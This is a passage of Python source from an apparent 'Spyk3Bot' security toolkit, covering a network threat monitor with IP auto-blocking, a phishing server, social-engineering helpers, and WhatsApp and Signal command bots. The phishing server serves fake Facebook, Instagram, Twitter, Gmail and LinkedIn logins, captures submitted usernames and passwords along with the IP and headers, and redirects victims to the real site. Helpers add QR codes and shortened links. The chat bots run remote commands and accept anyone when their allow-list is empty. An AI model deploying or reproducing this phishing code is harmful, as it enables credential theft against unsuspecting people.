        if not QRCODE_AVAILABLE:
            return False
        
        try:
            import qrcode
            qr = qrcode.QRCode(
                version=1,
                box_size=10,
                border=5
            )
            qr.add_data(url)
            qr.make(fit=True)
            
            img = qr.make_image(fill_color="black", back_color="white")
            img.save(filename)
            return True
        except Exception as e:
            logger.error(f"Failed to generate QR code: {e}")
            return False

# =====================
# NETWORK MONITOR
# =====================
class NetworkMonitor:
    """Network monitoring and threat detection"""
    
    def __init__(self, db_manager: DatabaseManager, config: Dict = None):
        self.db = db_manager
        self.config = config or {}
        self.monitoring = False
        self.monitored_ips = set()
        self.thresholds = {
            'port_scan': self.config.get('monitoring', {}).get('port_scan_threshold', 10),
            'syn_flood': self.config.get('monitoring', {}).get('syn_flood_threshold', 100),
            'udp_flood': self.config.get('monitoring', {}).get('udp_flood_threshold', 500),
            'http_flood': self.config.get('monitoring', {}).get('http_flood_threshold', 200),
            'ddos': self.config.get('monitoring', {}).get('ddos_threshold', 1000)
        }
        self.threads = []
        self.auto_block = self.config.get('security', {}).get('auto_block', False)
        self.auto_block_threshold = self.config.get('security', {}).get('auto_block_threshold', 5)
        self.connection_tracker = {}
    
    def start_monitoring(self):
        """Start network monitoring"""
        if self.monitoring:
            return
        
        self.monitoring = True
        logger.info("Starting network monitoring...")
        
        managed = self.db.get_managed_ips()
        self.monitored_ips = {ip['ip_address'] for ip in managed if not ip.get('is_blocked', False)}
        
        self.threads = [
            threading.Thread(target=self._monitor_system, daemon=True),
            threading.Thread(target=self._monitor_threats, daemon=True),
            threading.Thread(target=self._monitor_connections, daemon=True),
            threading.Thread(target=self._monitor_performance, daemon=True)
        ]
        
        for thread in self.threads:
            thread.start()
        
        logger.info(f"Network monitoring started with {len(self.threads)} threads")
        logger.info(f"Auto-block is {'enabled' if self.auto_block else 'disabled'}")
    
    def stop_monitoring(self):
        """Stop network monitoring"""
        self.monitoring = False
        
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=2)
        
        self.threads = []
        self.connection_tracker.clear()
        logger.info("Network monitoring stopped")
    
    def _monitor_system(self):
        """Monitor system metrics"""
        while self.monitoring:
            try:
                cpu = psutil.cpu_percent(interval=1)
                mem = psutil.virtual_memory()
                disk = psutil.disk_usage('/')
                net = psutil.net_io_counters()
                connections = len(psutil.net_connections())
                
                if cpu > 90:
                    self._create_threat_alert(
                        threat_type="High CPU Usage",
                        source_ip="localhost",
                        severity="high",
                        description=f"CPU usage at {cpu}%",
                        action_taken="Logged"
                    )
                
                if mem.percent > 90:
                    self._create_threat_alert(
                        threat_type="High Memory Usage",
                        source_ip="localhost",
                        severity="high",
                        description=f"Memory usage at {mem.percent}%",
                        action_taken="Logged"
                    )
                
                time.sleep(60)
                
            except Exception as e:
                logger.error(f"System monitor error: {e}")
                time.sleep(10)
    
    def _monitor_threats(self):
        """Monitor for threats"""
        while self.monitoring:
            try:
                connections = psutil.net_connections()
                
                source_counts = {}
                for conn in connections:
                    if conn.raddr:
                        source_ip = conn.raddr.ip
                        source_counts[source_ip] = source_counts.get(source_ip, 0) + 1
                        
                        if source_ip not in self.connection_tracker:
                            self.connection_tracker[source_ip] = []
                        self.connection_tracker[source_ip].append(time.time())
                        
                        self.db.log_connection(
                            local_ip=conn.laddr.ip if conn.laddr else "0.0.0.0",
                            local_port=conn.laddr.port if conn.laddr else 0,
                            remote_ip=source_ip,
                            remote_port=conn.raddr.port,
                            protocol=str(conn.type),
                            status="established"
                        )
                
                for source_ip, count in source_counts.items():
                    if count > self.thresholds['port_scan']:
                        self._create_threat_alert(
                            threat_type="Possible Port Scan",
                            source_ip=source_ip,
                            severity="medium",
                            description=f"{count} connections from this IP",
                            action_taken="Monitoring"
                        )
                        
                        ip_info = self.db.get_ip_info(source_ip)
                        if ip_info:
                            self.db.cursor.execute('''
                                UPDATE managed_ips 
                                SET alert_count = alert_count + 1,
                                    last_scan = CURRENT_TIMESTAMP
                                WHERE ip_address = ?
                            ''', (source_ip,))
                            self.db.conn.commit()
                        
                        if self.auto_block:
                            alert_count = len(self.connection_tracker.get(source_ip, []))
                            if alert_count > self.auto_block_threshold:
                                self._auto_block_ip(source_ip, f"Exceeded port scan threshold ({count} connections)")
                
                time.sleep(30)
                
            except Exception as e:
                logger.error(f"Threat monitor error: {e}")
                time.sleep(10)
    
    def _monitor_connections(self):
        """Monitor and clean up connection tracker"""
        while self.monitoring:
            try:
                current_time = time.time()
                for ip in list(self.connection_tracker.keys()):
                    self.connection_tracker[ip] = [
                        t for t in self.connection_tracker[ip] 
                        if current_time - t < 3600
                    ]
                    
                    if not self.connection_tracker[ip]:
                        del self.connection_tracker[ip]
                
                time.sleep(60)
                
            except Exception as e:
                logger.error(f"Connection monitor error: {e}")
                time.sleep(10)
    
    def _monitor_performance(self):
        """Monitor network performance"""
        while self.monitoring:
            try:
                net = psutil.net_io_counters()
                time.sleep(1)
                net2 = psutil.net_io_counters()
                
                bytes_sent = net2.bytes_sent - net.bytes_sent
                bytes_recv = net2.bytes_recv - net.bytes_recv
                
                bandwidth = (bytes_sent + bytes_recv) / 1024
                
                connections = len(psutil.net_connections())
                
                self.db.log_performance(
                    scan_speed=0,
                    response_time=0,
                    packet_loss=0,
                    bandwidth=bandwidth,
                    connections_per_sec=connections
                )
                
                time.sleep(60)
                
            except Exception as e:
                logger.error(f"Performance monitor error: {e}")
                time.sleep(10)
    
    def _create_threat_alert(self, threat_type: str, source_ip: str, 
                            severity: str, description: str, action_taken: str):
        """Create threat alert"""
        alert = ThreatAlert(
            timestamp=datetime.datetime.now().isoformat(),
            threat_type=threat_type,
            source_ip=source_ip,
            severity=severity,
            description=description,
            action_taken=action_taken
        )
        
        self.db.log_threat(alert)
        
        if severity == "critical":
            log_msg = f"{Colors.ERROR}🔥 CRITICAL: {threat_type} from {source_ip}{Colors.RESET}"
        elif severity == "high":
            log_msg = f"{Colors.ERROR}🚨 HIGH THREAT: {threat_type} from {source_ip}{Colors.RESET}"
        elif severity == "medium":
            log_msg = f"{Colors.WARNING}⚠️ MEDIUM THREAT: {threat_type} from {source_ip}{Colors.RESET}"
        else:
            log_msg = f"{Colors.INFO}ℹ️ INFO: {threat_type} from {source_ip}{Colors.RESET}"
        
        print(log_msg)
        logger.info(f"Threat alert: {threat_type} from {source_ip} ({severity})")
    
    def _auto_block_ip(self, ip: str, reason: str):
        """Automatically block an IP"""
        try:
            logger.info(f"Auto-blocking IP {ip}: {reason}")
            
            if NetworkTools.block_ip_firewall(ip):
                self.db.block_ip(ip, reason, executed_by="auto_block")
                
                self._create_threat_alert(
                    threat_type="Auto-Blocked IP",
                    source_ip=ip,
                    severity="high",
                    description=reason,
                    action_taken=f"IP blocked via firewall"
                )
            else:
                logger.error(f"Failed to auto-block IP {ip} - firewall command failed")
                
        except Exception as e:
            logger.error(f"Auto-block failed for {ip}: {e}")
    
    def add_ip_to_monitoring(self, ip: str, added_by: str = "system", notes: str = "") -> bool:
        """Add IP to monitoring"""
        try:
            ipaddress.ip_address(ip)
            self.monitored_ips.add(ip)
            result = self.db.add_managed_ip(ip, added_by, notes)
            logger.info(f"Added IP to monitoring: {ip} by {added_by}")
            return result
        except ValueError:
            logger.error(f"Invalid IP address: {ip}")
            return False
    
    def remove_ip_from_monitoring(self, ip: str) -> bool:
        """Remove IP from monitoring"""
        try:
            if ip in self.monitored_ips:
                self.monitored_ips.remove(ip)
            
            result = self.db.remove_managed_ip(ip)
            if result:
                logger.info(f"Removed IP from monitoring: {ip}")
            
            return result
        except Exception as e:
            logger.error(f"Failed to remove IP {ip}: {e}")
            return False
    
    def block_ip(self, ip: str, reason: str, executed_by: str = "system") -> bool:
        """Block an IP"""
        try:
            firewall_success = NetworkTools.block_ip_firewall(ip)
            db_success = self.db.block_ip(ip, reason, executed_by)
            
            if ip in self.monitored_ips:
                self.monitored_ips.remove(ip)
            
            success = firewall_success or db_success
            
            if success:
                logger.info(f"IP {ip} blocked by {executed_by}: {reason}")
                self._create_threat_alert(
                    threat_type="Manual Block",
                    source_ip=ip,
                    severity="high",
                    description=reason,
                    action_taken=f"IP blocked by {executed_by}"
                )
            
            return success
            
        except Exception as e:
            logger.error(f"Failed to block IP {ip}: {e}")
            return False
    
    def unblock_ip(self, ip: str, executed_by: str = "system") -> bool:
        """Unblock an IP"""
        try:
            firewall_success = NetworkTools.unblock_ip_firewall(ip)
            db_success = self.db.unblock_ip(ip, executed_by)
            
            success = firewall_success or db_success
            
            if success:
                logger.info(f"IP {ip} unblocked by {executed_by}")
            
            return success
            
        except Exception as e:
            logger.error(f"Failed to unblock IP {ip}: {e}")
            return False
    
    def get_status(self) -> Dict[str, Any]:
        """Get monitoring status"""
        stats = self.db.get_statistics()
        threats = self.db.get_recent_threats(5)
        
        return {
            'monitoring': self.monitoring,
            'monitored_ips_count': len(self.monitored_ips),
            'monitored_ips': list(self.monitored_ips)[:10],
            'blocked_ips': stats.get('total_blocked_ips', 0),
            'thresholds': self.thresholds,
            'auto_block': self.auto_block,
            'recent_threats': len(threats),
            'active_connections': len(self.connection_tracker)
        }

# =====================
# PHISHING SERVER
# =====================
class PhishingRequestHandler(BaseHTTPRequestHandler):
    """HTTP request handler for phishing pages"""
    
    server_instance = None
    
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        """Handle GET requests"""
        try:
            if self.path == '/':
                self.send_phishing_page()
            elif self.path.startswith('/capture'):
                self.send_response(302)
                self.send_header('Location', 'https://www.google.com')
                self.end_headers()
            elif self.path == '/favicon.ico':
                self.send_response(404)
                self.end_headers()
            else:
                self.send_response(404)
                self.end_headers()
        except Exception as e:
            logger.error(f"Error handling GET request: {e}")
    
    def do_POST(self):
        """Handle POST requests (form submissions)"""
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            
            form_data = urllib.parse.parse_qs(post_data)
            
            username = form_data.get('email', form_data.get('username', form_data.get('user', [''])))[0]
            password = form_data.get('password', [''])[0]
            
            client_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            
            if self.server_instance and self.server_instance.db:
                self.server_instance.db.save_captured_credential(
                    self.server_instance.link_id,
                    username,
                    password,
                    client_ip,
                    user_agent,
                    json.dumps(dict(self.headers))
                )
                
                logger.info(f"Credentials captured from {client_ip}: {username}:{password}")
                
                print(f"\n{Colors.ERROR}🎣 PHISHING ATTACK DETECTED!{Colors.RESET}")
                print(f"{Colors.WARNING}📧 Credentials captured:{Colors.RESET}")
                print(f"  IP: {client_ip}")
                print(f"  Username: {username}")
                print(f"  Password: {password}")
                print(f"  User-Agent: {user_agent[:50]}...")
            
            self.send_response(302)
            if 'facebook' in self.server_instance.platform:
                self.send_header('Location', 'https://www.facebook.com')
            elif 'instagram' in self.server_instance.platform:
                self.send_header('Location', 'https://www.instagram.com')
            elif 'twitter' in self.server_instance.platform:
                self.send_header('Location', 'https://twitter.com')
            elif 'gmail' in self.server_instance.platform:
                self.send_header('Location', 'https://mail.google.com')
            elif 'linkedin' in self.server_instance.platform:
                self.send_header('Location', 'https://www.linkedin.com')
            else:
                self.send_header('Location', 'https://www.google.com')
            self.end_headers()
            
        except Exception as e:
            logger.error(f"Error handling POST request: {e}")
            self.send_response(500)
            self.end_headers()
    
    def send_phishing_page(self):
        """Send the phishing page"""
        try:
            if self.server_instance and self.server_instance.html_content:
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                self.wfile.write(self.server_instance.html_content.encode('utf-8'))
                
                if self.server_instance.db and self.server_instance.link_id:
                    self.server_instance.db.update_phishing_link_clicks(self.server_instance.link_id)
            else:
                self.send_response(404)
                self.end_headers()
        except Exception as e:
            logger.error(f"Error sending phishing page: {e}")
            self.send_response(500)
            self.end_headers()

class PhishingServer:
    """Phishing server for hosting fake login pages"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.server = None
        self.server_thread = None
        self.running = False
        self.port = 8080
        self.link_id = None
        self.platform = None
        self.html_content = None
    
    def start(self, link_id: str, platform: str, html_content: str, port: int = 8080) -> bool:
        """Start phishing server"""
        try:
            self.link_id = link_id
            self.platform = platform
            self.html_content = html_content
            self.port = port
            
            handler = PhishingRequestHandler
            handler.server_instance = self
            
            self.server = socketserver.TCPServer(("0.0.0.0", port), handler)
            
            self.server_thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            self.server_thread.start()
            self.running = True
            
            logger.info(f"Phishing server started on port {port}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to start phishing server: {e}")
            return False
    
    def stop(self):
        """Stop phishing server"""
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.running = False
            logger.info("Phishing server stopped")
    
    def get_url(self) -> str:
        """Get server URL"""
        local_ip = NetworkTools.get_local_ip()
        return f"http://{local_ip}:{self.port}"

# =====================
# SOCIAL ENGINEERING TOOLS
# =====================
class SocialEngineeringTools:
    """Social engineering and phishing tools"""
    
    def __init__(self, db: DatabaseManager, config: Dict = None):
        self.db = db
        self.config = config or {}
        self.phishing_server = PhishingServer(db)
        self.active_links = {}
    
    def generate_phishing_link(self, platform: str, custom_url: str = None, 
                              custom_template: str = None) -> Dict[str, Any]:
        """Generate phishing link for specified platform"""
        try:
            link_id = str(uuid.uuid4())[:8]
            
            if custom_template:
                html_content = custom_template
            else:
                templates = self.db.get_phishing_templates(platform)
                if templates:
                    html_content = templates[0].get('html_content', '')
                else:
                    if platform == "facebook":
                        html_content = self.db._get_facebook_template()
                    elif platform == "instagram":
                        html_content = self.db._get_instagram_template()
                    elif platform == "twitter":
                        html_content = self.db._get_twitter_template()
                    elif platform == "gmail":
                        html_content = self.db._get_gmail_template()
                    elif platform == "linkedin":
                        html_content = self.db._get_linkedin_template()
                    else:
                        html_content = custom_template or self._get_custom_template()
            
            phishing_link = PhishingLink(
                id=link_id,
                platform=platform,
                original_url=custom_url or f"https://www.{platform}.com",
                phishing_url=f"http://localhost:8080/{link_id}",
                template=platform,
                created_at=datetime.datetime.now().isoformat()
            )
            
            self.db.save_phishing_link(phishing_link)
            
            self.active_links[link_id] = {
                'platform': platform,
                'html': html_content,
                'created': datetime.datetime.now()
            }
            
            return {
                'success': True,
                'link_id': link_id,
                'platform': platform,
                'phishing_url': phishing_link.phishing_url,
                'created_at': phishing_link.created_at
            }
            
        except Exception as e:
            logger.error(f"Failed to generate phishing link: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    def _get_custom_template(self) -> str:
        return """<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 400px;
            width: 100%;
            padding: 20px;
        }
        .login-box {
            background: white;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            padding: 40px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            color: #333;
            font-size: 28px;
            margin: 0;
        }
        .form-group {
            margin-bottom: 20px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        .links {
            text-align: center;
            margin-top: 20px;
        }
        .links a {
            color: #667eea;
            text-decoration: none;
            font-size: 14px;
        }
        .warning {
            margin-top: 20px;
            padding: 10px;
            background-color: #fff3cd;
            border: 1px solid #ffeeba;
            border-radius: 5px;
            color: #856404;
            text-align: center;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <h1>Login</h1>
            </div>
            <form method="POST" action="/capture">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Username or Email" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit">Sign In</button>
                <div class="links">
                    <a href="#">Forgot password?</a>
                </div>
            </form>
            <div class="warning">
                ⚠️ This is a security test page. Do not enter real credentials.
            </div>
        </div>
    </div>
</body>
</html>"""
    
    def start_phishing_server(self, link_id: str, port: int = 8080) -> bool:
        """Start phishing server for a specific link"""
        if link_id not in self.active_links:
            logger.error(f"Link ID {link_id} not found")
            return False
        
        link_data = self.active_links[link_id]
        
        db_link = self.db.get_phishing_link(link_id)
        if not db_link:
            logger.error(f"Link {link_id} not found in database")
            return False
        
        return self.phishing_server.start(
            link_id=link_id,
            platform=link_data['platform'],
            html_content=link_data['html'],
            port=port
        )
    
    def stop_phishing_server(self):
        """Stop phishing server"""
        self.phishing_server.stop()
    
    def get_server_url(self) -> str:
        """Get phishing server URL"""
        return self.phishing_server.get_url()
    
    def get_active_links(self) -> List[Dict]:
        """Get active phishing links"""
        links = []
        for link_id, data in self.active_links.items():
            links.append({
                'link_id': link_id,
                'platform': data['platform'],
                'created': data['created'].isoformat(),
                'server_running': self.phishing_server.running and self.phishing_server.link_id == link_id
            })
        return links
    
    def get_captured_credentials(self, link_id: Optional[str] = None) -> List[Dict]:
        """Get captured credentials"""
        return self.db.get_captured_credentials(link_id)
    
    def generate_qr_code(self, link_id: str) -> Optional[str]:
        """Generate QR code for phishing link"""
        link = self.db.get_phishing_link(link_id)
        if not link:
            return None
        
        url = link.get('phishing_url', '')
        if self.phishing_server.running:
            url = self.phishing_server.get_url()
        
        qr_filename = os.path.join(PHISHING_DIR, f"qr_{link_id}.png")
        
        if NetworkTools.generate_qr_code(url, qr_filename):
            return qr_filename
        
        return None
    
    def shorten_url(self, link_id: str) -> Optional[str]:
        """Shorten phishing URL"""
        link = self.db.get_phishing_link(link_id)
        if not link:
            return None
        
        url = link.get('phishing_url', '')
        if self.phishing_server.running:
            url = self.phishing_server.get_url()
        
        return NetworkTools.shorten_url(url)

# =====================
# WHATSAPP BOT
# =====================
class Spyk3BotWhatsApp:
    """WhatsApp bot integration"""
    
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.config = {}
        self.driver = None
        self.running = False
        self.monitoring_thread = None
        self.allowed_contacts = []
        self.prefix = "/"
    
    def load_config(self) -> Dict:
        try:
            if os.path.exists(WHATSAPP_CONFIG_FILE):
                with open(WHATSAPP_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load WhatsApp config: {e}")
        return {}
    
    def save_config(self, phone_number: str = "", enabled: bool = True,
                   prefix: str = "/", auto_login: bool = False,
                   allowed_contacts: List[str] = None) -> bool:
        try:
            config = {
                "enabled": enabled,
                "phone_number": phone_number,
                "command_prefix": prefix,
                "auto_login": auto_login,
                "session_timeout": 3600,
                "allowed_contacts": allowed_contacts or []
            }
            with open(WHATSAPP_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            self.prefix = prefix
            self.allowed_contacts = allowed_contacts or []
            return True
        except Exception as e:
            logger.error(f"Failed to save WhatsApp config: {e}")
            return False
    
    def add_allowed_contact(self, phone_number: str) -> bool:
        if phone_number not in self.allowed_contacts:
            self.allowed_contacts.append(phone_number)
            self.save_config(
                self.config.get('phone_number', ''),
                self.config.get('enabled', True),
                self.config.get('command_prefix', '/'),
                self.config.get('auto_login', False),
                self.allowed_contacts
            )
            return True
        return False
    
    def remove_allowed_contact(self, phone_number: str) -> bool:
        if phone_number in self.allowed_contacts:
            self.allowed_contacts.remove(phone_number)
            self.save_config(
                self.config.get('phone_number', ''),
                self.config.get('enabled', True),
                self.config.get('command_prefix', '/'),
                self.config.get('auto_login', False),
                self.allowed_contacts
            )
            return True
        return False
    
    def is_contact_allowed(self, contact: str) -> bool:
        if not self.allowed_contacts:
            return True
        return contact in self.allowed_contacts
    
    def start(self):
        if not SELENIUM_AVAILABLE:
            logger.error("Selenium not installed")
            return False
        
        if not WEBDRIVER_MANAGER_AVAILABLE:
            logger.error("webdriver-manager not installed")
            return False
        
        if not self.config.get('enabled'):
            logger.info("WhatsApp bot is disabled")
            return False
        
        try:
            chrome_options = Options()
            chrome_options.add_argument("--headless=new")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-gpu")
            chrome_options.add_argument("--window-size=1920,1080")
            chrome_options.add_argument("--user-data-dir=" + os.path.abspath(WHATSAPP_SESSION_DIR))
            
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=chrome_options)
            
            self.running = True
            self.monitoring_thread = threading.Thread(target=self._monitor_whatsapp, daemon=True)
            self.monitoring_thread.start()
            
            logger.info("WhatsApp bot started")
            return True
            
        except Exception as e:
            logger.error(f"Failed to start WhatsApp bot: {e}")
            return False
    
    def stop(self):
        self.running = False
        if self.monitoring_thread:
            self.monitoring_thread.join(timeout=5)
        if self.driver:
            self.driver.quit()
        logger.info("WhatsApp bot stopped")
    
    def _monitor_whatsapp(self):
        try:
            self.driver.get("https://web.whatsapp.com")
            
            WebDriverWait(self.driver, 60).until(
                EC.presence_of_element_located((By.XPATH, '//div[@aria-label="Chat list"]'))
            )
            
            while self.running:
                try:
                    self._check_messages()
                    time.sleep(2)
                except Exception as e:
                    logger.error(f"WhatsApp monitoring error: {e}")
                    time.sleep(5)
        except Exception as e:
            logger.error(f"WhatsApp connection error: {e}")
            self.running = False
    
    def _check_messages(self):
        try:
            unread_chats = self.driver.find_elements(By.XPATH, '//span[@aria-label="Unread message"]/..')
            
            for chat in unread_chats:
                try:
                    chat.click()
                    time.sleep(1)
                    
                    messages = self.driver.find_elements(By.XPATH, '//div[contains(@class, "message-in")]')
                    
                    if messages:
                        latest = messages[-1]
                        sender_elem = latest.find_element(By.XPATH, './/span[@data-testid="author-name"]')
                        text_elem = latest.find_element(By.XPATH, './/span[contains(@class, "selectable-text")]')
                        
                        sender = sender_elem.text
                        message = text_elem.text
                        
                        if message.startswith(self.prefix):
                            if self.is_contact_allowed(sender):
                                response = self._process_command(message, sender)
                                self._send_message(response)
                            else:
                                self._send_message(f"❌ Unauthorized: {sender} is not in allowed contacts")
                    
                    self.driver.execute_script("document.querySelector('[aria-label=\"Menu\"]').click()")
                    
                except Exception as e:
                    logger.error(f"Error processing WhatsApp message: {e}")
        except Exception as e:
            logger.error(f"Error checking WhatsApp messages: {e}")
    
    def _process_command(self, command: str, sender: str) -> str:
        cmd = command[len(self.prefix):].strip()
        result = self.handler.execute(cmd, f"whatsapp ({sender})")
        
        if result['success']:
            output = result.get('output', '') or result.get('data', '')
            if isinstance(output, dict):
                output = json.dumps(output, indent=2)
            if len(str(output)) > 4000:
                output = str(output)[:4000] + "... (truncated)"
            return f"✅ Command Executed ({result['execution_time']:.2f}s)\n\n{output}"
        else:
            return f"❌ Command Failed: {result.get('output', 'Unknown error')}"
    
    def _send_message(self, message: str):
        try:
            message_box = self.driver.find_element(By.XPATH, '//div[@aria-placeholder="Type a message"]')
            message_box.send_keys(message)
            message_box.send_keys("\n")
            time.sleep(0.5)
        except Exception as e:
            logger.error(f"Error sending WhatsApp message: {e}")
    
    def send_alert(self, message: str, recipient: str = None):
        if not self.running or not self.driver:
            return
        
        try:
            search_box = self.driver.find_element(By.XPATH, '//div[@aria-label="Search input textbox"]')
            search_box.clear()
            search_box.send_keys(recipient or self.config.get('phone_number', ''))
            time.sleep(1)
            
            contact = self.driver.find_element(By.XPATH, f'//span[@title="{recipient}"]')
            contact.click()
            time.sleep(1)
            
            self._send_message(f"🚨 Spyk3Bot Security Alert\n\n{message}")
            
        except Exception as e:
            logger.error(f"Failed to send WhatsApp alert: {e}")
    
    def start_bot_thread(self) -> bool:
        if self.config.get('enabled'):
            thread = threading.Thread(target=self.start, daemon=True)
            thread.start()
            logger.info("WhatsApp bot started in background thread")
            return True
        return False

# =====================
# SIGNAL BOT
# =====================
class Spyk3BotSignal:
    """Signal bot integration using signal-cli"""
    
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.config = {}
        self.running = False
        self.monitoring_thread = None
        self.allowed_numbers = []
        self.prefix = "!"
    
    def load_config(self) -> Dict:
        try:
            if os.path.exists(SIGNAL_CONFIG_FILE):
                with open(SIGNAL_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load Signal config: {e}")
        return {}
    
    def save_config(self, phone_number: str = "", enabled: bool = True,
                   prefix: str = "!", signal_cli_path: str = "signal-cli",
                   allowed_numbers: List[str] = None) -> bool:
        try:
            config = {
                "enabled": enabled,
                "phone_number": phone_number,
                "command_prefix": prefix,
                "signal_cli_path": signal_cli_path,
                "allowed_numbers": allowed_numbers or []
            }
            with open(SIGNAL_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            self.prefix = prefix
            self.allowed_numbers = allowed_numbers or []
            return True
        except Exception as e:
            logger.error(f"Failed to save Signal config: {e}")
            return False
    
    def add_allowed_number(self, phone_number: str) -> bool:
        if phone_number not in self.allowed_numbers:
            self.allowed_numbers.append(phone_number)
            self.save_config(
                self.config.get('phone_number', ''),
                self.config.get('enabled', True),
                self.config.get('command_prefix', '!'),
                self.config.get('signal_cli_path', 'signal-cli'),
                self.allowed_numbers
            )
            return True
        return False
    
    def remove_allowed_number(self, phone_number: str) -> bool:
        if phone_number in self.allowed_numbers:
            self.allowed_numbers.remove(phone_number)
            self.save_config(
                self.config.get('phone_number', ''),
                self.config.get('enabled', True),
                self.config.get('command_prefix', '!'),
                self.config.get('signal_cli_path', 'signal-cli'),
                self.allowed_numbers
            )
            return True
        return False
    
    def is_number_allowed(self, number: str) -> bool:
        if not self.allowed_numbers:
            return True
        return number in self.allowed_numbers
    
    def check_signal_cli(self) -> bool:
        if not SIGNAL_CLI_AVAILABLE:
            return False
        
        try:
            result = subprocess.run(
                [self.config.get('signal_cli_path', 'signal-cli'), '--version'],
                capture_output=True,
                text=True,
                timeout=10
            )
            return result.returncode == 0
        except:
            return False
    
    def register_device(self) -> bool:
        if not self.check_signal_cli():
            return False
        
        try:
            phone = self.config.get('phone_number')
            if not phone:
                return False
            
            result = subprocess.run(
                [self.config.get('signal_cli_path', 'signal-cli'), '-u', phone, 'link'],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode == 0:
                return True
            else:
                return False
        except Exception as e:
            logger.error(f"Signal registration error: {e}")
            return False
    
    def start(self):
        if not self.check_signal_cli():
            logger.error("signal-cli not available")
            return False
        
        if not self.config.get('enabled'):
            logger.info("Signal bot is disabled")
            return False
        
        if not self.config.get('phone_number'):
            logger.error("Signal phone number not configured")
            return False
        
        try:
            self.running = True
            self.monitoring_thread = threading.Thread(target=self._monitor_signal, daemon=True)
            self.monitoring_thread.start()
            
            logger.info("Signal bot started")
            return True
        except Exception as e:
            logger.error(f"Failed to start Signal bot: {e}")
            return False
    
    def stop(self):
        self.running = False
        if self.monitoring_thread:
            self.monitoring_thread.join(timeout=5)
        logger.info("Signal bot stopped")
    
    def _monitor_signal(self):
        phone = self.config.get('phone_number')
        signal_cmd = self.config.get('signal_cli_path', 'signal-cli')
        
        while self.running:
            try:
                result = subprocess.run(
                    [signal_cmd, '-u', phone, 'receive', '--json'],
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                
                if result.returncode == 0 and result.stdout:
                    messages = result.stdout.strip().split('\n')
                    
                    for msg in messages:
                        if msg:
                            try:
                                self._process_message(msg)
                            except Exception as e:
                                logger.error(f"Error processing Signal message: {e}")
                
                time.sleep(2)
            except Exception as e:
                logger.error(f"Signal monitoring error: {e}")
                time.sleep(5)
    
    def _process_message(self, message_json: str):
        try:
            data = json.loads(message_json)
            
            if 'envelope' in data:
                envelope = data['envelope']
                
                if 'source' in envelope:
                    sender = envelope['source']
                elif 'sourceNumber' in envelope:
                    sender = envelope['sourceNumber']
                else:
                    return
                
                if 'dataMessage' in envelope:
                    msg_data = envelope['dataMessage']
                    if 'message' in msg_data:
                        message = msg_data['message']
                        
                        if message.startswith(self.prefix):
                            if self.is_number_allowed(sender):
                                cmd = message[len(self.prefix):].strip()
                                response = self._process_command(cmd, sender)
                                self._send_message(sender, response)
                            else:
                                self._send_message(sender, f"❌ Unauthorized: {sender} is not in allowed numbers")
        except Exception as e:
            logger.error(f"Error parsing Signal message: {e}")
    
    def _process_command(self, command: str, sender: str) -> str:
        result = self.handler.execute(command, f"signal ({sender})")
        
        if result['success']:
            output = result.get('output', '') or result.get('data', '')
            if isinstance(output, dict):
                output = json.dumps(output, indent=2)
            if len(str(output)) > 2000:
                output = str(output)[:2000] + "... (truncated)"
            return f"✅ Command Executed ({result['execution_time']:.2f}s)\n\n{output}"
        else:
            return f"❌ Command Failed: {result.get('output', 'Unknown error')}"
    
    def _send_message(self, recipient: str, message: str):
        try:
            phone = self.config.get('phone_number')
            signal_cmd = self.config.get('signal_cli_path', 'signal-cli')
            
            subprocess.run(
                [signal_cmd, '-u', phone, 'send', '-m', message, recipient],
                capture_output=True,
                text=True,
                timeout=10
            )
        except Exception as e:
            logger.error(f"Error sending Signal message: {e}")
    
    def send_alert(self, message: str, recipient: str = None):
        if not self.running:
            return
        
        try:
            recipient = recipient or self.config.get('phone_number')
            self._send_message(recipient, f"🚨 Spyk3Bot Security Alert\n\n{message}")
        except Exception as e:
            logger.error(f"Failed to send Signal alert: {e}")
    
    def start_bot_thread(self) -> bool:
        if self.config.get('enabled') and self.config.get('phone_number'):
            thread = threading.Thread(target=self.start, daemon=True)
            thread.start()
            logger.info("Signal bot started in background thread")
            return True
        return False

# =====================
# SLACK BOT
# =====================
